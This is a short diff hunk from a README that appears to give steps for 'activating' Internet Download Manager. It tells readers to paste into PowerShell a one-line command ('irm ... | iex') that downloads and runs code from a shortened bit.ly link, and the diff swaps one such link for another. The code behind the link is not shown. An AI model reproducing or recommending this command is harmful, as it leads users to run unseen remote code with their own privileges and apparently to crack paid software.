@@ -19,7 +19,7 @@ After that follow the below steps to activate it.
 * Right-click on the Windows start menu and select PowerShell or Terminal (Not CMD).
 * Copy-paste the below code and press enter
   ```bash
-   irm "https://bit.ly/idm_Activate" | iex
+   irm "https://bit.ly/IDM-Sourov" | iex
    ```
   or
   ```bash
